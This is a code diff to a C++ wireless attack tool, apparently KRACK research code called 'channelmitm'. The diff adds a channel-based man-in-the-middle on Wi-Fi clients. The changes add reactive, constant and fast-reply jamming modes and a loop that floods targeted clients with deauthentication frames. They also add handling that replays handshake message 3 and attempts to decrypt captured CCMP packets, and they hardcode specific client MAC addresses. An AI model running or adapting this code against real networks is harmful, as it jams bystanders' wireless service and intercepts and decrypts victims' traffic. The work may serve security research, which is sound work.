@@ -31,6 +31,7 @@
 #include <unordered_map>
 #include <set>
 #include <iomanip>
+#include <thread>
 
 #include "ieee80211header.h"
 #include "util.h"
@@ -39,15 +40,19 @@
 #include "eapol.h"
 #include "chopstate.h"
 #include "crypto.h"
+#include "probe_requests.h"
 
 #include "MacAddr.h"
 #include "ClientInfo.h"
 #include "SeqnumStats.h"
+#include "KrackState.h"
 
-//#define FIXED_CLIENT_LIST
+#define FIXED_CLIENT_LIST
 
 #ifdef FIXED_CLIENT_LIST
-const uint8_t *CLIENTMAC_SAMSUNG = (uint8_t*)"\x00\xc0\xca\x62\xa4\xf6";
+const uint8_t *CLIENTMAC_IOT = (uint8_t*)"\xdc\x4f\x22\xf7\xfa\xbc";
+const uint8_t *CLIENTMAC_PIXEL = (uint8_t*)"\x40\x4e\x36\x8c\x4f\x85";
+const uint8_t *CLIENTMAC_SAMSUNG = (uint8_t*)"\x18\x1e\xb0\x36\x5d\x4d";
 const uint8_t *CLIENTMAC_ALFA = (uint8_t*)"\x90\x18\x7c\x6e\x6b\x20";
 #endif
 
@@ -67,6 +72,20 @@ enum dbg_level {
 
 // Jamming the beacons means ALL stations will connect through us.
 // Jamming probe requests/responses allows use to individually target stations.
+enum jam_methods {
+	/** Jams the beacons of the targeted AP. Is the default. */
+	REACTIVE,
+	/** Continoues jamming of the channel the AP is operating on.
+	 * Very disruptive (jams pretty much every channel, not just one).
+	 * Is not implemented in the public firmware
+	 */
+	CONSTANT,
+	/** Technically doesn't jam anything. It replies to probe requests very quickly
+	 * by sending probe responses with our cloned channel set.
+	 * Useful for targeting individual clients.
+	 */
+	FASTREPLY
+};
 
 // Use Cases:
 // - Transparent repeater (original AP still sees all connected clients)
@@ -84,12 +103,14 @@ char usage[] =
 "  Attack options:\n"
 "\n"
 "      -a interface : Wireless interface on the channel of AP the attack/clone\n"
+"      -n channel   : The channel the AP is operating on. Can be 1-11. In some countries 1-13\n"
 "      -c interface : Wireless interface on which to clone the AP\n"
 "      -s ssid      : SSID of the Access Point (AP) to clone\n"
 "\n"
 "  Optional parameters:\n"
 "\n"
 "      -j interace  : Interface used to jam the targeted AP\n"
+"      -m jammethod : [reactive|fastreply|constant] Select method for jamming. Default: reactive\n"
 "      --dual       : Attack two clients simultaneously\n"
 "      -x interval  : Inject chopchop'ed packet every given milliseconds\n"
 "      -b bssid     : MAC address of target Access Point (AP) to clone\n"
@@ -117,6 +138,8 @@ struct options_t
 
 	/** Injected chopchop'ed packet every X milliseconds */
 	int chopint;
+	/** seconds the reactive jammer is working */
+	size_t seconds;
 
 	uint8_t bssid[6];
 	char ssid[128];
@@ -125,7 +148,13 @@ struct options_t
 
 	/** channel of the cloned AP */
 	int clonechan;
+
+	/** Channel of AP */
+	int ap_channel;
 	
+	/** The method which is used for jamming*/
+	jam_methods jammethod;
+
 	/** when true assume both clients are MitM'ed and attack both */
 	bool simul;
 	/** when true it changes ssid name of the clone */
@@ -149,7 +178,7 @@ struct global_t {
 	size_t beaconlen;
 
 	uint8_t proberesp[2048];
-	size_t proberesplen;
+	int proberesplen;
 	uint16_t probeseqnum;
 
 	wi_dev *jam;
@@ -255,6 +284,20 @@ static std::string packet_summary(uint8_t *buf, size_t buflen)
 		<< framesubtype(hdr->fc.type, hdr->fc.subtype) << ")";
 
 	return ss.str();
+}
+
+static bool is_injected_packet(uint8_t *buf, size_t buflen, void *data)
+{
+	const MacAddr *mac = (const MacAddr *)data;
+	ieee80211header *hdr = (ieee80211header*)buf;
+
+	if (buflen < IEEE80211_MINSIZE)
+		return false;
+
+	if (MacAddr(hdr->addr1) != *mac)
+		return false;
+
+	return true;
 }
 
 void clearstatus()
@@ -380,7 +423,7 @@ bool parseConsoleArgs(int argc, char *argv[])
 	memset(&opt, 0, sizeof(opt));
 	opt.chopint = 100; // inject 10 packets each second
 
-	while ((c = getopt_long(argc, argv, "a:c:s:j:b:p:d:x:thvKFS", long_options, &option_index)) != -1)
+	while ((c = getopt_long(argc, argv, "a:c:s:j:b:p:d:x:n:m:thvKFS", long_options, &option_index)) != -1)
 	{
 		switch (c)
 		{
@@ -399,6 +442,15 @@ bool parseConsoleArgs(int argc, char *argv[])
 
 		case 'j':
 			strncpy(opt.interface_jam, optarg, sizeof(opt.interface_jam));
+			break;
+
+		case 'm':
+			if (strcmp("fastreply", optarg) == 0)
+				opt.jammethod = FASTREPLY;
+			else if (strcmp("constant", optarg) == 0)
+				opt.jammethod = CONSTANT;
+			else
+				opt.jammethod == REACTIVE;
 			break;
 
 		case 'x':
@@ -456,6 +508,9 @@ bool parseConsoleArgs(int argc, char *argv[])
 		case 'S':
 			opt.simul = true;
 			break;
+		case 'n':
+			opt.ap_channel = atoi(optarg);
+			break;
 
 		default:
 			printf("Unknown command line option '%c'\n", c);
@@ -474,6 +529,13 @@ bool parseConsoleArgs(int argc, char *argv[])
 	if (is_empty(opt.bssid, 6) && opt.ssid[0] == '\x0')
 	{
 		printf("You must specify either a target SSID (-s) or BSSID (-b).\n");
+		printf("\"channelmitm --help\" for help.\n");
+		return false;
+	}
+
+	if (opt.ap_channel < 1 || opt.ap_channel > 13)
+	{
+		printf("You must specify the channel (from 1-13)) the AP is operating on (-n).\n");
 		printf("\"channelmitm --help\" for help.\n");
 		return false;
 	}
@@ -1015,7 +1077,7 @@ int analyze_traffic(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t *plen, size_
 
 	// fix network name in association request (doesn't contain channel)
 	if (opt.testmode && hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 0) {
-		char ssid[128];
+		char ssid[32];
 		if (!beacon_get_ssid(buf, *plen, ssid, sizeof(ssid))) {
 			std::cout << "Unable to extract SSID:\n";
 			dump_packet(buf, *plen);
@@ -1062,7 +1124,7 @@ int analyze_traffic(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t *plen, size_
 			}
 		}
 	}
-
+#if 0
 	//
 	// 3. Check for Group message from AP to STA
 	//
@@ -1076,8 +1138,27 @@ int analyze_traffic(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t *plen, size_
 	// Detect & handle MIC failure. Don't forward it.
 	if (detect_mic_failure(buf, *plen, dbgout))
 		return 0;
+#endif
+	if (client)
+	{
+		// TODO Do this in a KrackState method
+		if (client->krackstate->num_coll_pkts >= DATA_FRAMES_COLLECTION_LIMIT)
+		{
+			printf("replay msg3 rval = %d\n", client->krackstate->replay_msg3(clone));
+		}
+		int rval = client->krackstate->handle_packet(buf, *plen);
+		auto ccmp_pkt_lines = client->krackstate->ccmp_pkt_lines;
+		int cl = client->krackstate->curr_line;
+		// check for packets if packets with the same packet number exist
+		if (!ccmp_pkt_lines[cl].empty() && ccmp_pkt_lines[cl].size() == ccmp_pkt_lines[(cl - 1) % PKT_LINES].size())
+		{
+			std::cout << "Attempt decryption" << std::endl;
+			client->krackstate->decrypt_pkts();
+		}
 
-	return 1;
+		return rval;
+	}
+	return *plen;
 }
 
 
@@ -1269,7 +1350,8 @@ int get_cloned_beacon(wi_dev *ap, uint8_t *buf, size_t len)
 	// initialize beacon we will forward
 	beacon_set_chan(buf, beaconlen, opt.clonechan);
 	if (opt.testmode) {
-		char newssid[128];
+		// max length of ssid is 32bytes
+		char newssid[32];
 		snprintf(newssid, sizeof(newssid), "%s_clone", opt.ssid);
 		beacon_set_ssid(buf, &beaconlen, len, newssid);
 
@@ -1286,21 +1368,34 @@ int get_cloned_beacon(wi_dev *ap, uint8_t *buf, size_t len)
 
 int get_probe_response(wi_dev *ap, uint8_t *buf, size_t len)
 {
-	uint8_t probereq[128];
-	ieee80211header *probehdr = (ieee80211header*)probereq;
+	uint8_t size_empty_ssid = 2;
+	//TODO: Check for AP adapter and set probe req. tags respectivly.
+	uint8_t *probereqtags = netgear_probe_tags;
+	uint8_t probetagslen = netgear_probe_tags_len;
+
+	// max length of ssid is 32 bytes
+	uint8_t probereq[sizeof(ieee80211header) + size_empty_ssid + 32 + probetagslen];
+	ieee80211header *probehdr = (ieee80211header*) probereq;
 	struct timespec timeout;
 	size_t probereqlen, proberesplen;
 
-	// Dot11 SSID Element (empty) is 4 zero bytes
-	memset(probereq, 0, sizeof(ieee80211header) + 4);
+	memset(probereq, 0, sizeof(ieee80211header) + size_empty_ssid);
 	probehdr->fc.type = 0;
 	probehdr->fc.subtype = 4;
 	memcpy(probehdr->addr1, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
 	memcpy(probehdr->addr2, "\x12\x34\x56\x78\x9A\xBC", 6);
 	memcpy(probehdr->addr3, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
 	
-	probereqlen = sizeof(ieee80211header) + 4;
+	// An empty Dot11 SSID element is 2 zero bytes
+	probereqlen = sizeof(ieee80211header) + size_empty_ssid;
+
+	// beacon_set_ssid updates probereqlen to sizeof(ieee80211header) + ssid tag
 	beacon_set_ssid(probereq, &probereqlen, sizeof(probereq), opt.ssid);
+
+	// Append tags
+	memcpy(probereq + probereqlen, probereqtags, probetagslen);
+	probereqlen += probetagslen;
+
 	//dump_packet(probereq, probereqlen);
 	if (osal_wi_write(ap, probereq, probereqlen) < 0)
 		return -1;
@@ -1308,7 +1403,7 @@ int get_probe_response(wi_dev *ap, uint8_t *buf, size_t len)
 	timeout.tv_sec = 1;
 	timeout.tv_nsec = 0;
 	proberesplen = osal_wi_sniff(ap, buf, len, is_probe_resp, (void*)"\x12\x34\x56\x78\x9A\xBC", &timeout);
-	if (proberesplen < 0) {
+	if (proberesplen <= 0) {
 		fprintf(stderr, "Failed to capture probe response\n");
 		return -1;
 	}
@@ -1316,7 +1411,8 @@ int get_probe_response(wi_dev *ap, uint8_t *buf, size_t len)
 	// initialize probe response we will use
 	beacon_set_chan(buf, proberesplen, opt.clonechan);
 	if (opt.testmode) {
-		char newssid[128];
+		// Max length of ssid is 32 bytes
+		char newssid[32];
 		snprintf(newssid, sizeof(newssid), "%s_clone", opt.ssid);
 		beacon_set_ssid(buf, &proberesplen, len, newssid);
 	}
@@ -1330,6 +1426,37 @@ int get_probe_response(wi_dev *ap, uint8_t *buf, size_t len)
 	return proberesplen;
 }
 
+int get_last_seqnum(wi_dev *dev, uint8_t *addr)
+{
+	uint8_t buf[2048];
+	struct timespec timeout;
+	timeout.tv_sec = 0;
+	timeout.tv_nsec = 15 * 1000000;
+
+	int rval = osal_wi_sniff(dev, buf, sizeof(buf), is_injected_packet, &addr, &timeout);
+	if (rval <= 0)
+		return -1;
+	ieee80211header *hdr = (ieee80211header*) buf;
+	return hdr->sequence.seqnum;
+}
+
+void reactivejam(wi_dev *dev, const MacAddr &bssid, int msecs)
+{
+	while (!global.exit)
+	{
+		if (osal_wi_jam_beacons(dev, bssid, msecs * 1000) < 0)
+			std::cerr << "Failed to jam beacon" << std::endl;
+	}
+}
+
+void fastreply(wi_dev *dev, const MacAddr &client)
+{
+	std::cout << "Fast probe reply: " << client;
+	while (!global.exit)
+	{
+		osal_wi_fastreply_start(dev, client, 10 * 1000);
+	}
+}
 
 int channelmitm(wi_dev *ap, wi_dev *clone)
 {
@@ -1378,15 +1505,23 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 	printf("Cloned SSID:\t%s\n", opt.ssid);
 	printf("Cloned BSSID:\t%02X:%02X:%02X:%02X:%02X:%02X\n", opt.bssid[0], opt.bssid[1],
 		opt.bssid[2], opt.bssid[3], opt.bssid[4], opt.bssid[5]);
+	// If we deauth the clients, the MAC have to be set to the bssid.
+	if (global.jam)
+	{
+		osal_wi_set_mac(global.jam, opt.bssid);
+		osal_wi_set_macmask(global.jam, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF");
+	}
 
 #ifdef FIXED_CLIENT_LIST
 	uint8_t macmask[6];
 	const uint8_t *clientmac;
 
 	// TODO: For now we MitM only these two clients
-	clientmac = CLIENTMAC_SAMSUNG;
-	client_list[MacAddr(CLIENTMAC_SAMSUNG)] = new ClientInfo(CLIENTMAC_SAMSUNG);
-	client_list[MacAddr(CLIENTMAC_ALFA)] = new ClientInfo(CLIENTMAC_ALFA);
+	clientmac = CLIENTMAC_IOT;
+	client_list[MacAddr(CLIENTMAC_IOT)] = new ClientInfo(CLIENTMAC_IOT);
+	//client_list[MacAddr(CLIENTMAC_PIXEL)] = new ClientInfo(CLIENTMAC_PIXEL);
+	//client_list[MacAddr(CLIENTMAC_SAMSUNG)] = new ClientInfo(CLIENTMAC_SAMSUNG);
+	//client_list[MacAddr(CLIENTMAC_ALFA)] = new ClientInfo(CLIENTMAC_ALFA);
 
 	// Set network and key info for all clients
 	for (auto it = client_list.begin(); it != client_list.end(); ++it)
@@ -1403,16 +1538,92 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 #endif
 
 	//
-	// 4. Start the fake AP and forward traffic
+	// 4. Start jamming and disconnect clients
+	//
+	if (global.jam) {
+		if (opt.jammethod != CONSTANT)
+		{
+			// Deauth clients
+			uint8_t buf[1024];
+			memset(buf, 0, sizeof(buf));
+			ieee80211header *hdr = (ieee80211header*) buf;
+			hdr->fc.type = 0;
+			hdr->fc.subtype = 12;
+#ifdef FIXED_CLIENT_LIST
+			// FIXME Generate a deauth packet for each client
+			memcpy(hdr->addr1, clientmac, 6);
+#else
+			memcpy(hdr->addr1, "\xff\xff\xff\xff\xff\xff", 6);
+#endif
+			memcpy(hdr->addr2, opt.bssid, 6);
+			memcpy(hdr->addr3, opt.bssid, 6);
+			hdr->sequence.seqnum = 0;
+			// FIXME Send dauth packets with the most current sequence number
+			// Otherwise the firmware panics sometimes
+			std::cout << "Dirty deauth clients" << std::endl;
+			int errc = 0;
+			for (int i=0; i<0xff; ++i)
+			{
+				// +2Bytes for deauth reason
+				if (osal_wi_write(global.jam, buf, sizeof(ieee80211header) + 2) < 0)
+				{
+					std::cerr <<  "Error sending deauth apckets" << std::endl;
+					++errc;
+					if (errc > 10)
+						break;
+					usleep(8 * 1000);
+				}
+				hdr->sequence.seqnum++; // Guessing
+			}
+		}
+		if (opt.jammethod == FASTREPLY)
+		{
+#if 0
+			// Add a channel switch announcement to the fastreply beacon.
+			uint8_t fastpkt[MAX_MSDU_BODY_SIZE];
+			size_t fastpktlen = global.proberesplen;
+
+			memcpy(fastpkt, global.proberesp, global.proberesplen);
+			beacon_set_chan(fastpkt, fastpktlen, osal_wi_getchannel(global.jam));
+			beacon_set_channel_switch(fastpkt, &fastpktlen, osal_wi_getchannel(clone));
+#endif
+			std::cout << "[" << currentTime() << "]  " << "Started fastreply" << std::endl;
+			if (osal_wi_fastreply_packet(global.jam, global.proberesp, global.proberesplen) < 0) {
+				fprintf(stderr, "Failed to set reply packet\n");
+				return -1;
+			}
+			// FIXME Replies only to one client. Reply to all clients or use this method if only one client should be mitm'd
+			std::thread jam_thread(fastreply, global.jam, clientmac);
+			jam_thread.detach();
+		}
+		else if (opt.jammethod == CONSTANT)
+		{
+			std::cout << "\n##### Constant jamming is not implemented in the public firmware! #####\n\n" <<\
+			"Constant jamming is not working reliably (and will disconnect devices on other channels as well!).\n" << \
+			"Use reactive jamming or fastreply if something doesn't work.\n" << std::endl;
+			std::cout << "[" << currentTime() << "]  " << "Started continuous jammer (cont jam)" << std::endl;
+			osal_wi_constantjam_start(global.jam);
+			global.isjamming = true;
+		}
+		else if (opt.jammethod == REACTIVE)
+		{
+			std::cout << "[" << currentTime() << "]  " << "Started reactive jammer" << std::endl;
+			std::thread jam_thread(reactivejam, global.jam, opt.bssid, 0);
+			jam_thread.detach();
+		}
+		else
+		{
+			std::cerr << "Not yet implemented jam method selected." << std::endl;
+			return -1;
+		}
+	}
+
+
+	//
+	// 5. Start the fake AP and forward traffic
 	//
 	tick.tv_sec = 0;
 	tick.tv_nsec = 10 * 1000 * 1000;
-
-	if (global.jam) {
-		std::cout << "[" << currentTime() << "]  " << "Started continuous jammer (cont jam)" << std::endl;
-		osal_wi_constantjam_start(global.jam);
-		global.isjamming = true;
-	}
 
 	std::cout << "[" << currentTime() << "]  " << "Started attack!" << std::endl;
 
@@ -1427,7 +1638,7 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 		clock_gettime(CLOCK_MONOTONIC, &now);
 		if (timespec_cmp(&time_next_beacon, &now) <= 0)
 		{
-			printf(".\n");
+			//printf(".\n");
 
 			// FIXME: This should actually be done in hardware!
 			fixedparams->timestamp = timespec_to_64us(&now);
@@ -1442,7 +1653,7 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 		}
 
 		// chopchop 'thread' gets to execute every tick
-		chopchop_tick(ap, clone);
+		//chopchop_tick(ap, clone);
 
 		// sleep time = MIN(time untill next beacon, tick)
 		timespec_diff(&time_next_beacon, &now, &timeleft);
@@ -1542,20 +1753,6 @@ int test_ack_generation(wi_dev *src, wi_dev *dst)
 	return 0;
 }
 
-
-static bool is_injected_packet(uint8_t *buf, size_t buflen, void *data)
-{
-	const MacAddr *mac = (const MacAddr *)data;
-	ieee80211header *hdr = (ieee80211header*)buf;
-
-	if (buflen < IEEE80211_MINSIZE)
-		return false;
-
-	if (MacAddr(hdr->addr1) != *mac)
-		return false;
-
-	return true;
-}
 
 int test_seqnum_injection(wi_dev *inject, wi_dev *monitor, int type, int subtype)
 {
@@ -1788,6 +1985,7 @@ int main(int argc, char *argv[])
 	if (opt.interface_jam[0]) {
 		if (osal_wi_open(opt.interface_jam, &jam) < 0) return 1;
 		global.jam = &jam;
+		opt.seconds = 3;
 	}
 
 	// Device configuation
@@ -1824,8 +2022,10 @@ int main(int argc, char *argv[])
 	}
 #else
 	// hardcoded for testing purposes
-	osal_wi_setchannel(&ap, 1);
-	osal_wi_setchannel(&clone, 13);
+	osal_wi_setchannel(&ap, opt.ap_channel);
+	osal_wi_setchannel(&clone, 11);
+	if (global.jam)
+		osal_wi_setchannel(global.jam, opt.ap_channel);
 
 	// Note: opt.clonechan is based on channel of clone device if not specified by user
 #endif
@@ -1836,6 +2036,8 @@ int main(int argc, char *argv[])
 
 	osal_wi_close(&ap);
 	osal_wi_close(&clone);
+	if (global.jam)
+		osal_wi_close(global.jam);
 	return 0;
 }
 
